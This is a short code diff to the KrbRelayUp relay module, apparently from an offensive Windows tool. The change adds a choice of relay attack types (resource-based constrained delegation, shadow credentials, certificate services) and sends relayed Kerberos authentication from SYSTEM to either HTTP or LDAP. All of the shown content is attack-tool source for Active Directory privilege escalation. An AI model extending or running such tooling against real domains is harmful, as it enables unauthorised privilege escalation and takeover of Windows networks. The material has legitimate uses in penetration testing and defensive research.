@@ -12,6 +12,13 @@ using static KrbRelayUp.Relay.Natives;
 
 namespace KrbRelayUp.Relay
 {
+    public enum RelayAttackType
+    {
+        RBCD = 1,
+        ShadowCred = 2,
+        ADCS = 3
+    }
+
     class Relay
     {
         public static Guid clsId_guid = new Guid(Options.clsid);
@@ -186,8 +193,13 @@ namespace KrbRelayUp.Relay
             }
 
             // Relay Kerberos auth from NT/SYSTEM to LDAP
-            if(!Options.attackDone)
-                Ldap.Relay();
+            if (!Options.attackDone)
+            {
+                if (Options.relayAttackType == RelayAttackType.ADCS)
+                    Http.Relay();
+                else
+                    Ldap.Relay();
+            }
 
             //overwrite security buffer
             var pOutput2 = new SecurityBufferDescriptor(12288);
